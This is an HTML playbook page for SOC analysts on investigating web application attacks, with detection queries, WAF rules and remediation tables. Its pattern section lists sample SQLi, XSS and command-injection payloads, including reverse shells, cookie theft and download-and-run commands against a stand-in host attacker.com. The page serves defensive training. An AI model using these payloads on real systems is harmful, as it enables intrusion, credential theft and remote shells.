@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <base href="/NikDet/">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Application Attack Investigation Playbook | SOC Compendium</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <nav class="main-nav">
+        <a href="index.html" class="nav-brand"><div class="brand-icon"><i class="fas fa-shield-halved"></i></div><div class="brand-text"><span class="brand-title">SOC Compendium</span><span class="brand-subtitle">Detection &amp; Operations</span></div></a>
+    </nav>
+    <main class="main-content">
+        <div class="content-page">
+            <div class="breadcrumb">
+                <a href="index.html">Home</a><span class="separator">/</span>
+                <a href="pages/playbooks/index.html">Playbooks</a><span class="separator">/</span>
+                <a href="pages/playbooks/investigation/index.html">Investigation</a><span class="separator">/</span>
+                <span>Web Application Attacks</span>
+            </div>
+
+            <h1><i class="fas fa-globe"></i> Web Application Attack Investigation Playbook</h1>
+            <p class="lead">Complete investigation workflow for SQL injection, XSS, command injection, path traversal, and other web application attacks.</p>
+
+            <div class="content">
+                <!-- WHY THIS MATTERS -->
+                <h3 id="why-matters"><i class="fas fa-exclamation-circle"></i> Why This Investigation Matters</h3>
+                
+                <div class="info-box danger">
+                    <div class="info-box-title"><i class="fas fa-skull-crossbones"></i> Business Impact of Web Attacks</div>
+                    <table>
+                        <thead><tr><th>If You Don't Investigate...</th><th>Potential Outcome</th><th>Real-World Example</th></tr></thead>
+                        <tbody>
+                            <tr><td>SQL injection succeeds</td><td>Complete database dump, data breach</td><td>Equifax breach - 147M records via SQLi</td></tr>
+                            <tr><td>XSS not remediated</td><td>Session hijacking, credential theft</td><td>British Airways - 380K card details via XSS</td></tr>
+                            <tr><td>Command injection undetected</td><td>Server compromise, webshell deployed</td><td>Log4Shell led to cryptomining and ransomware</td></tr>
+                            <tr><td>Path traversal ignored</td><td>Config files, credentials exposed</td><td>Apache Struts vulnerability leaked sensitive files</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3>Web Attack Types Explained</h3>
+                <table>
+                    <thead><tr><th>Attack Type</th><th>What It Does</th><th>Detection Signature</th><th>Impact</th></tr></thead>
+                    <tbody>
+                        <tr><td><strong>SQL Injection (SQLi)</strong></td><td>Injects SQL commands via input fields</td><td>SQL keywords in parameters: ' OR 1=1, UNION SELECT</td><td>Database access, data theft</td></tr>
+                        <tr><td><strong>Cross-Site Scripting (XSS)</strong></td><td>Injects malicious scripts into pages</td><td>&lt;script&gt;, javascript:, onerror= in inputs</td><td>Session hijacking, defacement</td></tr>
+                        <tr><td><strong>Command Injection</strong></td><td>Executes OS commands via application</td><td>; | ` $() in parameters</td><td>Server compromise</td></tr>
+                        <tr><td><strong>Path Traversal</strong></td><td>Accesses files outside web root</td><td>../ sequences in URLs</td><td>File disclosure, config leak</td></tr>
+                        <tr><td><strong>Local File Inclusion (LFI)</strong></td><td>Includes local files in page</td><td>File paths in parameters</td><td>Code execution, info disclosure</td></tr>
+                        <tr><td><strong>Remote File Inclusion (RFI)</strong></td><td>Includes remote malicious files</td><td>URLs in file parameters</td><td>Remote code execution</td></tr>
+                        <tr><td><strong>XML External Entity (XXE)</strong></td><td>Exploits XML parser vulnerabilities</td><td>DOCTYPE, ENTITY in XML input</td><td>File read, SSRF</td></tr>
+                        <tr><td><strong>Server-Side Request Forgery (SSRF)</strong></td><td>Makes server request internal resources</td><td>Internal IPs, localhost in URLs</td><td>Internal network access</td></tr>
+                        <tr><td><strong>Insecure Deserialization</strong></td><td>Exploits object deserialization</td><td>Serialized objects in input</td><td>Remote code execution</td></tr>
+                    </tbody>
+                </table>
+
+                <!-- TRIGGERS -->
+                <h3 id="when-to-use"><i class="fas fa-clock"></i> When to Use This Playbook</h3>
+
+                <table>
+                    <thead><tr><th>Trigger</th><th>Source</th><th>Priority</th><th>First Action</th></tr></thead>
+                    <tbody>
+                        <tr><td style="color: #f85149;"><strong>WAF blocked attack with high severity</strong></td><td>WAF alerts</td><td>HIGH</td><td>Check if attack bypassed, scope target</td></tr>
+                        <tr><td style="color: #f85149;"><strong>Successful SQLi or RCE detected</strong></td><td>SIEM correlation</td><td>CRITICAL</td><td>Isolate if needed, preserve logs</td></tr>
+                        <tr><td style="color: #f0883e;"><strong>Unusual database queries</strong></td><td>Database audit logs</td><td>HIGH</td><td>Correlate with web requests</td></tr>
+                        <tr><td style="color: #f0883e;"><strong>Web shell detected on server</strong></td><td>EDR/AV alert</td><td>CRITICAL</td><td>Isolate server immediately</td></tr>
+                        <tr><td style="color: #d29922;"><strong>Vulnerability scanner activity</strong></td><td>IDS/WAF</td><td>MEDIUM</td><td>Verify if authorized test</td></tr>
+                        <tr><td style="color: #d29922;"><strong>Error messages in logs indicating attacks</strong></td><td>Application logs</td><td>MEDIUM</td><td>Review full request context</td></tr>
+                    </tbody>
+                </table>
+
+                <!-- ATTACK PATTERNS -->
+                <h3 id="patterns"><i class="fas fa-code"></i> Attack Pattern Recognition</h3>
+
+                <h3>SQL Injection Patterns</h3>
+                <div class="info-box">
+                    <div class="info-box-title"><i class="fas fa-database"></i> Common SQLi Payloads</div>
+                    <pre><code># Authentication bypass
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+admin'--
+' OR 1=1#
+
+# UNION-based extraction
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+# Time-based blind SQLi
+'; WAITFOR DELAY '0:0:5'--
+' AND SLEEP(5)--
+' OR IF(1=1, SLEEP(5), 0)--
+
+# Error-based SQLi
+' AND 1=CONVERT(int, @@version)--
+' AND extractvalue(1, concat(0x7e, version()))--
+
+# Out-of-band SQLi
+'; EXEC xp_dirtree '\\attacker.com\share'--</code></pre>
+                </div>
+
+                <h3>XSS Patterns</h3>
+                <div class="info-box">
+                    <div class="info-box-title"><i class="fas fa-code"></i> Common XSS Payloads</div>
+                    <pre><code># Basic script injection
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+
+# Event handlers
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+&lt;body onload=alert('XSS')&gt;
+
+# Encoded variants
+&lt;script&gt;eval(atob('YWxlcnQoJ1hTUycp'))&lt;/script&gt;
+&lt;img src=x onerror="&#97;&#108;&#101;&#114;&#116;('XSS')"&gt;
+
+# DOM-based XSS
+javascript:alert('XSS')
+data:text/html,&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+                </div>
+
+                <h3>Command Injection Patterns</h3>
+                <div class="info-box">
+                    <div class="info-box-title"><i class="fas fa-terminal"></i> Common Command Injection</div>
+                    <pre><code># Command separators
+; ls -la
+| cat /etc/passwd
+|| whoami
+&& id
+`id`
+$(whoami)
+
+# Common payloads
+; cat /etc/passwd
+| nc attacker.com 4444 -e /bin/sh
+; wget http://attacker.com/shell.sh | bash
+; curl http://attacker.com/shell.sh | sh
+
+# Windows variants
+& dir
+| type C:\Windows\System32\config\SAM
+& net user</code></pre>
+                </div>
+
+                <!-- INVESTIGATION STEPS -->
+                <h3 id="investigation"><i class="fas fa-search"></i> Investigation Steps</h3>
+
+                <h3>Step 1: Identify Attack Type and Scope</h3>
+
+                <h4>KQL - WAF/Web Log Analysis (Azure)</h4>
+                <pre><code>// Identify web attacks from WAF logs
+AzureDiagnostics
+| where ResourceProvider == "MICROSOFT.NETWORK"
+| where Category == "ApplicationGatewayFirewallLog"
+| where action_s == "Blocked" or action_s == "Detected"
+| summarize 
+    AttackCount = count(),
+    AttackTypes = make_set(ruleSetType_s),
+    Rules = make_set(ruleId_s)
+    by clientIp_s, requestUri_s, bin(TimeGenerated, 1h)
+| where AttackCount > 5
+| order by AttackCount desc</code></pre>
+
+                <h4>KQL - SQL Injection Detection</h4>
+                <pre><code>// Detect SQLi attempts in web logs
+AzureDiagnostics
+| where TimeGenerated > ago(24h)
+| where requestUri_s contains "'" 
+    or requestUri_s contains "UNION"
+    or requestUri_s contains "SELECT"
+    or requestUri_s contains "--"
+    or requestUri_s contains "/*"
+    or requestUri_s contains "OR 1=1"
+    or requestUri_s contains "AND 1=1"
+| extend SQLiIndicators = extract_all(@"('|UNION|SELECT|INSERT|UPDATE|DELETE|DROP|--|/\*|\*/|OR\s+1=1|AND\s+1=1|WAITFOR|SLEEP)", requestUri_s)
+| where array_length(SQLiIndicators) > 0
+| project TimeGenerated, clientIp_s, requestUri_s, SQLiIndicators, httpStatus_s
+| order by TimeGenerated desc</code></pre>
+
+                <h4>KQL - XSS Detection</h4>
+                <pre><code>// Detect XSS attempts
+AzureDiagnostics
+| where TimeGenerated > ago(24h)
+| where requestUri_s contains "&lt;script" 
+    or requestUri_s contains "javascript:"
+    or requestUri_s contains "onerror="
+    or requestUri_s contains "onload="
+    or requestUri_s contains "&lt;img"
+    or requestUri_s contains "&lt;svg"
+| extend XSSIndicators = extract_all(@"(<script|javascript:|onerror=|onload=|<img|<svg|<body|<iframe)", tolower(requestUri_s))
+| where array_length(XSSIndicators) > 0
+| project TimeGenerated, clientIp_s, requestUri_s, XSSIndicators, httpStatus_s
+| order by TimeGenerated desc</code></pre>
+
+                <h4>SPL - Web Attack Detection (Splunk)</h4>
+                <pre><code>index=web sourcetype=access_combined
+| eval attack_type=case(
+    match(uri_query, "(?i)(union.*select|select.*from|insert.*into|delete.*from|drop\s+table)"), "SQLi",
+    match(uri_query, "(?i)(<script|javascript:|onerror=|onload=)"), "XSS",
+    match(uri_query, "(?i)(;|\||`|\$\()"), "Command Injection",
+    match(uri_query, "(?i)(\.\.\/|\.\.\\\\)"), "Path Traversal",
+    true(), "Unknown"
+)
+| where attack_type!="Unknown"
+| stats count by src_ip, uri_path, attack_type, status
+| sort -count</code></pre>
+
+                <h3>Step 2: Determine Attack Success</h3>
+
+                <div class="info-box warning">
+                    <div class="info-box-title"><i class="fas fa-exclamation-triangle"></i> Signs of Successful Attack</div>
+                    <table>
+                        <thead><tr><th>Attack Type</th><th>Success Indicators</th><th>Where to Look</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>SQL Injection</strong></td><td>HTTP 200 with large response, database errors stopped appearing</td><td>Web logs, DB audit logs</td></tr>
+                            <tr><td><strong>XSS</strong></td><td>Payload stored and rendered to other users</td><td>Application data, victim browser activity</td></tr>
+                            <tr><td><strong>Command Injection</strong></td><td>New processes spawned by web server, outbound connections</td><td>EDR, process logs, netflow</td></tr>
+                            <tr><td><strong>Path Traversal</strong></td><td>Sensitive file contents in response</td><td>Web logs, response body if logged</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>KQL - Check for Successful Exploitation</h4>
+                <pre><code>// Look for successful attacks (200 responses to attack requests)
+let AttackIPs = AzureDiagnostics
+| where TimeGenerated > ago(24h)
+| where action_s == "Blocked"
+| distinct clientIp_s;
+// Check if same IPs got 200 responses
+AzureDiagnostics
+| where TimeGenerated > ago(24h)
+| where clientIp_s in (AttackIPs)
+| where httpStatus_s == "200"
+| summarize 
+    SuccessfulRequests = count(),
+    URIs = make_set(requestUri_s, 50)
+    by clientIp_s
+| order by SuccessfulRequests desc</code></pre>
+
+                <h3>Step 3: Server-Side Impact Assessment</h3>
+
+                <h4>Check for Web Shell Deployment</h4>
+                <pre><code>// KQL - Detect web shell activity
+DeviceProcessEvents
+| where TimeGenerated > ago(24h)
+| where InitiatingProcessFileName in ("w3wp.exe", "httpd", "nginx", "apache2", "php-fpm", "java")
+| where FileName in ("cmd.exe", "powershell.exe", "bash", "sh", "python", "perl", "whoami", "net.exe")
+| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
+| order by TimeGenerated desc</code></pre>
+
+                <h4>SPL - Suspicious Process from Web Server</h4>
+                <pre><code>index=endpoint sourcetype=sysmon EventCode=1
+| where parent_process_name IN ("w3wp.exe", "httpd", "nginx", "apache2", "java.exe")
+| where process_name IN ("cmd.exe", "powershell.exe", "bash", "sh", "whoami", "net.exe", "net1.exe")
+| table _time, host, parent_process_name, process_name, command_line
+| sort -_time</code></pre>
+
+                <h3>Step 4: Database Impact Assessment (for SQLi)</h3>
+
+                <h4>KQL - Database Query Analysis</h4>
+                <pre><code>// Check for unusual database queries
+AzureDiagnostics
+| where ResourceProvider == "MICROSOFT.SQL"
+| where Category == "SQLSecurityAuditEvents"
+| where statement_s contains "UNION" 
+    or statement_s contains "information_schema"
+    or statement_s contains "sys.tables"
+    or statement_s contains "xp_cmdshell"
+| project TimeGenerated, client_ip_s, database_name_s, statement_s, succeeded_s
+| order by TimeGenerated desc</code></pre>
+
+                <h4>Check for Data Exfiltration</h4>
+                <pre><code>// Large data transfers after SQL injection
+AzureDiagnostics
+| where TimeGenerated > ago(24h)
+| where clientIp_s == "ATTACKER_IP"
+| summarize TotalBytes = sum(toint(sentBytes_s)), RequestCount = count() by bin(TimeGenerated, 5m)
+| where TotalBytes > 1000000  // More than 1MB
+| order by TimeGenerated asc</code></pre>
+
+                <!-- CONTAINMENT -->
+                <h3 id="containment"><i class="fas fa-shield-alt"></i> Containment Actions</h3>
+
+                <table>
+                    <thead><tr><th>Finding</th><th>Immediate Action</th><th>Implementation</th></tr></thead>
+                    <tbody>
+                        <tr>
+                            <td style="color: #f85149;"><strong>Active exploitation</strong></td>
+                            <td>Block attacker IP at WAF/Firewall</td>
+                            <td>WAF rule, NSG, or edge firewall block</td>
+                        </tr>
+                        <tr>
+                            <td style="color: #f85149;"><strong>Web shell deployed</strong></td>
+                            <td>Isolate server, preserve evidence</td>
+                            <td>Network isolation, disk snapshot</td>
+                        </tr>
+                        <tr>
+                            <td style="color: #f85149;"><strong>Database compromised</strong></td>
+                            <td>Revoke app DB credentials, assess data access</td>
+                            <td>Rotate credentials, enable detailed audit</td>
+                        </tr>
+                        <tr>
+                            <td style="color: #f0883e;"><strong>Vulnerable endpoint identified</strong></td>
+                            <td>Apply virtual patch at WAF</td>
+                            <td>WAF rule to block specific payload patterns</td>
+                        </tr>
+                        <tr>
+                            <td style="color: #d29922;"><strong>Scanning activity</strong></td>
+                            <td>Rate limit or block scanner</td>
+                            <td>WAF rate limiting rule</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>WAF Virtual Patching Example (ModSecurity)</h4>
+                <pre><code># Block specific SQLi pattern
+SecRule ARGS "@rx (?i)(union.*select|select.*from.*where)" \
+    "id:100001,\
+    phase:2,\
+    block,\
+    msg:'SQL Injection Attempt',\
+    severity:'CRITICAL'"
+
+# Block XSS patterns
+SecRule ARGS "@rx (?i)(<script|javascript:|onerror=)" \
+    "id:100002,\
+    phase:2,\
+    block,\
+    msg:'XSS Attempt',\
+    severity:'HIGH'"</code></pre>
+
+                <!-- INDICATORS -->
+                <h3 id="indicators"><i class="fas fa-fingerprint"></i> Indicators to Collect</h3>
+
+                <table>
+                    <thead><tr><th>Indicator Type</th><th>Examples</th><th>Use For</th></tr></thead>
+                    <tbody>
+                        <tr><td><strong>Source IPs</strong></td><td>Attacking IP addresses</td><td>Blocking, reputation sharing</td></tr>
+                        <tr><td><strong>User Agents</strong></td><td>Scanner signatures, custom tools</td><td>Detection rules</td></tr>
+                        <tr><td><strong>Attack Payloads</strong></td><td>Specific SQLi/XSS strings used</td><td>WAF rules, detection</td></tr>
+                        <tr><td><strong>Target Endpoints</strong></td><td>Vulnerable URLs/parameters</td><td>Remediation priority</td></tr>
+                        <tr><td><strong>Web Shells</strong></td><td>File names, hashes, paths</td><td>EDR detection, forensics</td></tr>
+                        <tr><td><strong>C2 Domains</strong></td><td>If command injection used for callback</td><td>Network blocking</td></tr>
+                    </tbody>
+                </table>
+
+                <!-- MITRE MAPPING -->
+                <h3 id="mitre"><i class="fas fa-map"></i> MITRE ATT&CK Mapping</h3>
+
+                <table>
+                    <thead><tr><th>Technique ID</th><th>Technique Name</th><th>Web Attack Type</th></tr></thead>
+                    <tbody>
+                        <tr><td><strong>T1190</strong></td><td>Exploit Public-Facing Application</td><td>All web attacks</td></tr>
+                        <tr><td><strong>T1059.001</strong></td><td>PowerShell (via command injection)</td><td>Command Injection</td></tr>
+                        <tr><td><strong>T1505.003</strong></td><td>Web Shell</td><td>Post-exploitation</td></tr>
+                        <tr><td><strong>T1071.001</strong></td><td>Web Protocols (C2)</td><td>Web shell C2</td></tr>
+                        <tr><td><strong>T1083</strong></td><td>File and Directory Discovery</td><td>Path Traversal, LFI</td></tr>
+                    </tbody>
+                </table>
+
+                <!-- PREVENTION -->
+                <h3 id="prevention"><i class="fas fa-shield-virus"></i> Prevention Recommendations</h3>
+
+                <table>
+                    <thead><tr><th>Control</th><th>Implementation</th><th>Attack Type Mitigated</th></tr></thead>
+                    <tbody>
+                        <tr><td><strong>Input Validation</strong></td><td>Whitelist allowed characters, parameterized queries</td><td>SQLi, XSS, Command Injection</td></tr>
+                        <tr><td><strong>Output Encoding</strong></td><td>HTML entity encoding, context-aware escaping</td><td>XSS</td></tr>
+                        <tr><td><strong>Parameterized Queries</strong></td><td>Use prepared statements, ORMs</td><td>SQLi</td></tr>
+                        <tr><td><strong>WAF Deployment</strong></td><td>OWASP Core Rule Set, managed WAF</td><td>All</td></tr>
+                        <tr><td><strong>CSP Headers</strong></td><td>Content-Security-Policy to restrict script sources</td><td>XSS</td></tr>
+                        <tr><td><strong>Least Privilege</strong></td><td>Web app runs with minimal DB/OS permissions</td><td>Reduces impact</td></tr>
+                        <tr><td><strong>Security Testing</strong></td><td>SAST, DAST, penetration testing</td><td>All</td></tr>
+                    </tbody>
+                </table>
+
+                <!-- RELATED -->
+                <h3 id="related"><i class="fas fa-link"></i> Related Playbooks</h3>
+
+                <div class="card-grid">
+                    <a href="pages/playbooks/investigation/malware.html" class="card"><div class="card-icon"><i class="fas fa-virus"></i></div><h3>Malware Investigation</h3><p>If web shell deployed</p></a>
+                    <a href="pages/playbooks/investigation/data-exfiltration.html" class="card"><div class="card-icon"><i class="fas fa-file-export"></i></div><h3>Data Exfiltration</h3><p>If SQLi led to data theft</p></a>
+                    <a href="pages/playbooks/containment/network-actions.html" class="card"><div class="card-icon"><i class="fas fa-network-wired"></i></div><h3>Network Containment</h3><p>Blocking attacker IPs</p></a>
+                </div>
+
+            </div>
+        </div>
+        <footer class="main-footer"><p>© 2025 SOC & Detection Engineering Compendium</p></footer>
+    </main>
+    <script src="js/main.js"></script>
+</body>
+</html>
